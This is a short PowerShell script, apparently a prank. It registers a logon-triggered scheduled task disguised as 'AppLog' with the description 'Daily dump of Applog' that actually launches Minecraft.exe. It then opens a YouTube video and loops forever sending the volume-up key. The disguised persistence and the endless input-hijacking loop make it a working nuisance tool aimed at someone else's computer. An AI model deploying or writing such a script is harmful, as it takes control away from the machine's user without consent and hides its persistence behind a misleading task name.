$action = New-ScheduledTaskAction -Execute 'Minecraft.exe' `

  -Argument '-Path C:\Desktop\Minecraft.exe'

$trigger =  New-ScheduledTaskTrigger -ONLOGON

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AppLog" -Description "Daily dump of Applog"


Start-Process "https://youtu.be/gQfFOPFLo0U?t=11893"
while($true)
{
    $obj = new-object -com wscript.shell 
    $obj.SendKeys([char]175)
}